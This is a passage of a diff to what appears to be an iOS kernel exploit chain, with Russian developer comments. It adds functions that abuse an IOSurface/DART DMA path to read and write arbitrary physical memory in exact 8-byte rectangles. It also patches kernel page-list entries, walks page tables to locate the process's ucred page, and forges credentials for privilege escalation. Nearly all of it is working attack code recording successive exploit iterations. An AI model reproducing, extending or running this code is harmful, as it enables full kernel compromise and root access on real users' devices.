@@ -148,16 +148,14 @@ static uint64_t kpZoneVtoP(uint64_t va)
 // → prepare full-map → сериализация из её record buffer). Патчим её буфер на
 // targetPA>>14 ДО первого submit: DMA читает deadly-страницу как контент src
 // и кладёт в dstS. Поверхность выпускаем после чтения.
-// 1.9.258 (р.64): physread 16KB через DART — ПОЛНОСТЬЮ СВОЯ пара поверхностей.
-// Расклад промахов 252-257: (a) swap-оп дропается молча; (b) cmd-кэш src-фазы
-// ключуется по (off,len) — поверхность тех же dims (1024×128=0x80000) ловила
-// кэш-хит на маппинг srcS (sig=0x41 ×7); (c) dst на текущем pipe персистентен =
-// ctlPA. Лечение: свежий pipe + своя ПАРА 1024×64 (rdS источник с пропатченным
-// record buffer на targetPA>>14, dsS приёмник с реальным backing) — кэш-мисс по
-// (off,len=0,0x40000), identity по dims (урок 241: mismatch = kr=0xe00002c2).
-// DMA читает deadly-страницу как контент rdS и кладёт её в dsS.
+// 1.9.259 (р.64/65): physread через DART — своя пара + rect {x,y,w,h} (р.65 Q4:
+// TSD +0xdc=x, +0xe0=y, +0xe4=w, +0xec=h; на 1024-BGRA {194,0,2,1} = ровно 8
+// байт 0x308-0x30f = одна L3-запись). Свежий pipe + своя пара 1024×64 — кэш-мисс
+// по (off,len=0,0x40000), identity по dims. DMA читает целевую страницу как
+// контент rdS и кладёт rect-регион в dsS.
 static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, uint64_t isTable,
-                          uint64_t targetPA, uint8_t *out, NSMutableString *r)
+                          uint64_t targetPA, uint32_t rx, uint32_t ry, uint32_t rw, uint32_t rh,
+                          uint8_t *out, NSMutableString *r)
 {
     memset(out, 0, 0x4000);
     NSDictionary *spB = @{(__bridge id)kIOSurfaceWidth: @1024, (__bridge id)kIOSurfaceHeight: @64,
@@ -222,8 +220,12 @@ static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, u
             *(uint32_t *)(tsdR + 0) = rdID;
             *(uint32_t *)(tsdR + 4) = dsID;
             *(uint64_t *)(tsdR + 8) = 1;
-            *(uint32_t *)(tsdR + 0x0C) = 64;
-            *(uint32_t *)(tsdR + 0x10) = 64;
+            *(uint32_t *)(tsdR + 0x0C) = rw;
+            *(uint32_t *)(tsdR + 0x10) = rh;
+            *(uint32_t *)(tsdR + 0xdc) = rx;   // rect x (р.65 Q4: parser 0x928e854)
+            *(uint32_t *)(tsdR + 0xe0) = ry;   // rect y
+            *(uint32_t *)(tsdR + 0xe4) = rw;   // rect w
+            *(uint32_t *)(tsdR + 0xec) = rh;   // rect h
             kern_return_t rkr = IOConnectCallMethod(v2, 1, NULL, 0, tsdR, sizeof(tsdR), NULL, NULL, NULL, NULL);
             usleep(400000);
             early_kwrite64(rdBuf + 0x30, eSave);
@@ -231,10 +233,11 @@ static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, u
             IOServiceClose(v2);
             IOSurfaceLock(dsS, 0, NULL);
             uint8_t *spR = (uint8_t *)IOSurfaceGetBaseAddress(dsS);
-            if (spR) memcpy(out, spR, 0x4000);
+            uint32_t rlen = rw * rh * 4; if (rlen > 0x4000) rlen = 0x4000;
+            if (spR) memcpy(out, spR + (uint64_t)ry * 0x1000 + (uint64_t)rx * 4, rlen);
             IOSurfaceUnlock(dsS, 0, NULL);
-            kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] target=%#llx kr=0x%x sig=%#010x flags=%#x (fresh pipe+pair)",
-                      (unsigned long long)targetPA, rkr, *(uint32_t *)out, fR]);
+            kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] target=%#llx rect{%u,%u,%u,%u} kr=0x%x sig=%#010x flags=%#x",
+                      (unsigned long long)targetPA, rx, ry, rw, rh, rkr, *(uint32_t *)out, fR]);
             done = YES;
         } else {
             kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] fresh pipe: open kr=0x%x", ok2]);
@@ -245,6 +248,48 @@ static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, u
     CFRelease(rdS);
     CFRelease(dsS);
     return done;
+}
+
+// 1.9.259: physwrite РОВНО 8 байт в targetPA+0x308 через rect {194,0,2,1}
+// (1024-BGRA: байты 0x308-0x30f = одна L3-запись, р.65 Q4). Патчим entry[0]
+// dst-буфера на targetPA>>14, payload кладём в src+0x308, submit на СВЕЖЕМ pipe
+// (dst пересериализуется с ядом). Остальные 2047 qword'ов страницы не тронуты.
+static BOOL kpPhysWrite8(io_service_t svc, uint64_t dstBuf, uint32_t srcID, uint32_t dstID,
+                         IOSurfaceRef srcS, const uint8_t *tsdV, uint64_t targetPA, uint64_t payload,
+                         NSMutableString *r)
+{
+    if (!dstBuf || !srcS) return NO;
+    uint64_t tpage = targetPA & ~0x3fffULL;
+    uint64_t eSave = early_kread64(dstBuf + 0x30);
+    usleep(1500);
+    early_kwrite64(dstBuf + 0x30, (eSave & 0xffffffff00000000ULL) | (uint32_t)(tpage >> 14));
+    IOSurfaceLock(srcS, 0, NULL);
+    uint8_t *spW = (uint8_t *)IOSurfaceGetBaseAddress(srcS);
+    if (spW) *(uint64_t *)(spW + 0x308) = payload;
+    IOSurfaceUnlock(srcS, 0, NULL);
+    io_connect_t v2 = IO_OBJECT_NULL;
+    kern_return_t ok2 = IOServiceOpen(svc, mach_task_self(), 0, &v2);
+    kern_return_t rkr = -1;
+    if (ok2 == KERN_SUCCESS && v2) {
+        uint8_t tsdW[0x1B0];
+        memcpy(tsdW, tsdV, sizeof(tsdW));
+        *(uint32_t *)(tsdW + 0) = srcID;
+        *(uint32_t *)(tsdW + 4) = dstID;
+        *(uint64_t *)(tsdW + 8) = 1;
+        *(uint32_t *)(tsdW + 0x0C) = 2;
+        *(uint32_t *)(tsdW + 0x10) = 1;
+        *(uint32_t *)(tsdW + 0xdc) = 194;   // rect x → байты 0x308-0x30f
+        *(uint32_t *)(tsdW + 0xe0) = 0;     // rect y
+        *(uint32_t *)(tsdW + 0xe4) = 2;     // rect w (2 пикселя = 8 байт)
+        *(uint32_t *)(tsdW + 0xec) = 1;     // rect h
+        rkr = IOConnectCallMethod(v2, 1, NULL, 0, tsdW, sizeof(tsdW), NULL, NULL, NULL, NULL);
+        usleep(400000);
+        IOServiceClose(v2);
+    }
+    early_kwrite64(dstBuf + 0x30, eSave);
+    kpNote(r, [NSString stringWithFormat:@"  [PHYSWRITE8] target=%#llx payload=%#018llx kr=0x%x",
+              (unsigned long long)targetPA, payload, rkr]);
+    return ok2 == KERN_SUCCESS && rkr == 0;
 }
 
 // The EL2 domain faults in the physical aperture when read via the socket
@@ -6535,6 +6580,50 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 kpNote(r, [NSString stringWithFormat:@"  [CHAIN] гарант serialize (bit1 clear): flags %#x → %#x — %@", bfl247, fck, !(fck & 0x02) ? @"ВСТАЛО" : @"МИМО"]);
             }
         }
+        // 1.9.259 (р.65 Q3): type-0x20 → ranges-путь — записи {addr,len} stride 0x10
+        // по [pd+0x60], addr идёт СЫРО как PA (0x86eac8c-98). ranges[0].addr=ctlPA.
+        if (typ247 == 0x20) {
+            uint64_t rng = kp_untag_ptr(early_kread64(pd247 + 0x60));
+            uint64_t a0 = kpLooksLikeKernelPointer(rng) ? early_kread64(rng + 0x00) : 0;
+            uint64_t l0 = kpLooksLikeKernelPointer(rng) ? early_kread64(rng + 0x08) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  [CHAIN] type-0x20 ranges: rng=%#llx [0]={%#018llx,%#018llx} — %@",
+                      (unsigned long long)rng, (unsigned long long)a0, (unsigned long long)l0,
+                      kpLooksLikeKernelPointer(rng) ? @"патчим addr=ctlPA" : @"rng нет"]);
+            if (kpLooksLikeKernelPointer(rng) && nDep < 24) {
+                usleep(1500);
+                early_kwrite64(rng + 0x00, ctlPA);
+                uint64_t rb = early_kread64(rng + 0x00);
+                kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == ctlPA ? @"ПРИЛИПЛО" : @"МИМО"]);
+                hitAddr[nDep] = rng + 0x00; hitOld[nDep] = a0; hitForm[nDep] = 6; nDep++;
+            }
+        }
+        // 1.9.259 (р.65 Q1-L4): trailer-запись (buffer+0x30+cnt*8): +0x08 = внешний
+        // plist, +0x20 = флаги; bit1 SET = DIRECT-PTR — читается ВНЕШНИЙ оригинальный
+        // список, наши inline-записи мимо (подпись бута 258: яд нетронут, DMA в
+        // оригинал). Патчим и внешний список тоже.
+        if (buf247 && cnt247 && cnt247 < 0x1000) {
+            uint64_t tr = buf247 + 0x30 + (uint64_t)cnt247 * 8;
+            uint64_t tPlist = early_kread64(tr + 0x08);
+            uint64_t tFlags = early_kread64(tr + 0x20);
+            kpNote(r, [NSString stringWithFormat:@"  [CHAIN] trailer: plist=%#018llx flags=%#018llx — режим %@",
+                      (unsigned long long)tPlist, (unsigned long long)tFlags,
+                      (tFlags & 0x02) ? @"DIRECT-PTR (внешний список!)" : @"inline"]);
+            if ((tFlags & 0x02) && kpLooksLikeKernelPointer(tPlist)) {
+                for (uint32_t i = 0; i < 64 && nDep < 24; i++) {
+                    uint64_t e = early_kread64(tPlist + (uint64_t)i * 8);
+                    if ((uint32_t)e != pfn32) continue;
+                    if (!((uint32_t)(e >> 32) == 0 || (uint32_t)(e >> 32) == 4)) continue;
+                    kpNote(r, [NSString stringWithFormat:@"  [CHAIN] ★ внешний список entry[%u] @ %#llx: %#018llx → ctlPFN %#x",
+                              i, (unsigned long long)(tPlist + (uint64_t)i * 8), (unsigned long long)e, ctlPFN]);
+                    usleep(1500);
+                    early_kwrite64(tPlist + (uint64_t)i * 8, (e & 0xffffffff00000000ULL) | ctlPFN);
+                    uint64_t rb = early_kread64(tPlist + (uint64_t)i * 8);
+                    kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    hitAddr[nDep] = tPlist + (uint64_t)i * 8; hitOld[nDep] = e; hitForm[nDep] = 5; nDep++;
+                    break;
+                }
+            }
+        }
     }
     // 1.9.244: РАННИЙ ПАТЧ — page-0 записи page-list из SCAN A (найдены до любого
     // submit, до 9+ секунд DEP-скана = вне окна мины). zone-VA по значению хита
@@ -7724,6 +7813,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             uint64_t nq = (hitForm[i] == 1) ? ((hitOld[i] & 0x3fffULL) | ctlPA)
                         : (hitForm[i] == 3) ? (((uint64_t)ctlPFN << 32) | (hitOld[i] & 0xffffffffULL))
                         : (hitForm[i] == 5) ? ((hitOld[i] & 0xffffffff00000000ULL) | ctlPFN)
+                        : (hitForm[i] == 6) ? ctlPA
                         : (uint64_t)ctlPFN;
             early_kwrite64(hitAddr[i], nq);
         }
@@ -7821,19 +7911,37 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 if (!pagePA && errF == 1042 && kp_lastDeadlyTte && isTable && svc) {
                     uint64_t tpage = kp_lastDeadlyTte & ~0x3fffULL;
                     uint32_t tidx = (uint32_t)(kp_lastDeadlyTte & 0x3fff) / 8;
+                    // 1.9.259 (р.65 Q4): rect-подтверждённые 8-байтовые IO.
+                    // СЕЛФ-ТЕСТ на безопасной ctl: rect {194,0,2,1} = байты 0x308-0x30f,
+                    // соседи обязаны остаться 0xCC. Без подтверждения rect к L3 не идём.
+                    uint64_t markW = 0x1122334455667788ULL;
+                    BOOL rectOK = NO;
+                    if (buf247 && srcS) {
+                        rectOK = kpPhysWrite8(svc, buf247, srcID, dstID, srcS, tsdV, ctlPA, markW, r);
+                        uint64_t c0 = *(volatile uint64_t *)(ctl + 0x300);
+                        uint64_t c1 = *(volatile uint64_t *)(ctl + 0x308);
+                        uint64_t c2 = *(volatile uint64_t *)(ctl + 0x310);
+                        rectOK = rectOK && c1 == markW && c0 == 0xCCCCCCCCCCCCCCCCULL && c2 == 0xCCCCCCCCCCCCCCCCULL;
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] rect self-test: ctl+0x300=%#018llx +0x308=%#018llx +0x310=%#018llx — %@",
+                                  (unsigned long long)c0, (unsigned long long)c1, (unsigned long long)c2,
+                                  rectOK ? @"RECT ПОДТВЕРЖДЁН (8 байт точно)" : @"МИМО — 8-байтовый rect не работает"]);
+                    }
                     uint8_t timg[0x4000];
-                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] walker встал на L%d tte=%#llx — physread через DART",
-                              kp_lastDeadlyLvl, (unsigned long long)kp_lastDeadlyTte]);
-                    if (kpPhysRead16K(svc, tsdV, ttM, isTable, tpage, timg, r)) {
-                        uint64_t pte = 0; memcpy(&pte, timg + (uint64_t)tidx * 8, 8);
+                    uint32_t boff = tidx * 8;
+                    uint32_t rx = (boff % 0x1000) / 4, ry = boff / 0x1000;
+                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] walker встал на L%d tte=%#llx — physread rect {%u,%u,2,1} через DART",
+                              kp_lastDeadlyLvl, (unsigned long long)kp_lastDeadlyTte, rx, ry]);
+                    if (kpPhysRead16K(svc, tsdV, ttM, isTable, tpage, rx, ry, 2, 1, timg, r)) {
+                        uint64_t pte = 0; memcpy(&pte, timg, 8);
                         if (kp_lastDeadlyLvl == 2 && (pte & 0x3) == 0x3) {   // L2-запись → L3 таблица
                             uint64_t l3pa = pte & 0x0000ffffffffc000ULL;
                             uint32_t l3idx = (uint32_t)((pageVA >> 14) & 0x7ff);
+                            uint32_t b3 = l3idx * 8;
                             kpNote(r, [NSString stringWithFormat:@"  [FORGE] L2[%u] → L3 таблица %#llx, читаю её", tidx, (unsigned long long)l3pa]);
-                            if (!kpPhysRead16K(svc, tsdV, ttM, isTable, l3pa, timg, r)) pte = 0;
-                            else memcpy(&pte, timg + (uint64_t)l3idx * 8, 8);
+                            if (!kpPhysRead16K(svc, tsdV, ttM, isTable, l3pa, (b3 % 0x1000) / 4, b3 / 0x1000, 2, 1, timg, r)) pte = 0;
+                            else memcpy(&pte, timg, 8);
                         }
-                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] leaf PTE = %#018llx", pte]);
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] leaf PTE = %#018llx (rectOK=%d)", pte, rectOK]);
                         if ((pte & 0x3) == 0x3) pagePA = pte & 0x0000ffffffffc000ULL;
                     }
                 }
@@ -7848,7 +7956,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 // страницы сам охраняется (pkva=0 или q0a не сошёлся).
                 if (!paOK && pagePA && svc) {
                     uint8_t cimg[0x4000];
-                    if (kpPhysRead16K(svc, tsdV, ttM, isTable, pagePA, cimg, r)) {
+                    if (kpPhysRead16K(svc, tsdV, ttM, isTable, pagePA, 0, 0, 64, 64, cimg, r)) {
                         uint64_t q0c = 0; memcpy(&q0c, cimg, 8);
                         uint32_t uidViaC = 0; memcpy(&uidViaC, cimg + uoff + 0x18, 4);
                         if (q0c == q0b && uidViaC == (uint32_t)getuid()) {
@@ -7894,12 +8002,15 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                     : (hitForm[i] == 3) ? (((uint64_t)fPFN << 32) | (hitOld[i] & 0xffffffffULL))
                                     : (hitForm[i] == 4) ? ((hitOld[i] & 0xffffffff00000000ULL) | fPFN)
                                     : (hitForm[i] == 5) ? ((hitOld[i] & 0xffffffff00000000ULL) | fPFN)
+                                    : (hitForm[i] == 6) ? pagePA
                                     : (uint64_t)fPFN;
                         early_kwrite64(hitAddr[i], nq);
                     }
                     if (nDep) kpNote(r, [NSString stringWithFormat:@"  [FORGE] DEP-хиты перепатчены на ucredPFN (%d шт)", nDep]);
                     // victim#2 submit (bit43=0 — свежий rebuild из отравленного источника)
                     // 1.9.251: rect 64×64×4 = 0x4000 — форж покрывает всю 16KB-страницу ucred
+                    // 1.9.259: на СВЕЖЕМ pipe — dst пересериализуется с ucredPFN
+                    // (персистентный кэш старого pipe держит ctlPA, р.65 L1/L2).
                     uint8_t tsdF[0x1B0];
                     memcpy(tsdF, tsdV, sizeof(tsdF));
                     *(uint32_t *)(tsdF + 0) = srcID;
@@ -7907,9 +8018,18 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     *(uint64_t *)(tsdF + 8) = 1;
                     *(uint32_t *)(tsdF + 0x0C) = 64;
                     *(uint32_t *)(tsdF + 0x10) = 64;
-                    kern_return_t fkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdF, sizeof(tsdF), NULL, NULL, NULL, NULL);
-                    kpNote(r, [NSString stringWithFormat:@"  [FORGE] victim#2 submit (ucredPA): kr=0x%x — жду DMA в ucred", fkr]);
-                    usleep(400000);
+                    io_connect_t v3 = IO_OBJECT_NULL;
+                    kern_return_t ok3 = IOServiceOpen(svc, mach_task_self(), 0, &v3);
+                    kern_return_t fkr = -1;
+                    if (ok3 == KERN_SUCCESS && v3) {
+                        fkr = IOConnectCallMethod(v3, 1, NULL, 0, tsdF, sizeof(tsdF), NULL, NULL, NULL, NULL);
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] victim#2 submit (ucredPA, fresh pipe): kr=0x%x — жду DMA в ucred", fkr]);
+                        usleep(400000);
+                        IOServiceClose(v3);
+                    } else {
+                        kpNote(r, [NSString stringWithFormat:@"  [FORGE] fresh pipe#2: open kr=0x%x — victim#2 не было", ok3]);
+                        usleep(400000);
+                    }
                     uid_t gu = getuid(); gid_t gg = getgid();
                     uint32_t cru = (uint32_t)early_kread64(ucF + 0x18);
                     uint64_t lbl = early_kread64(ucF + 0x78);
